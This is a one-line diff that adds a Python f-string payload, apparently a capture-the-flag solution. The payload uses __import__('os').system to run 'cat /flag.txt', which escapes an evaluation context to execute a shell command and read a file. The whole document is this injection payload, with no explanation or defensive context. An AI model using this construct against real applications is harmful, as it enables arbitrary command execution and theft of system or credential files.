@@ -1,0 +1,1 @@
+print(f'{__import__("os").system("cat /flag.txt")}')
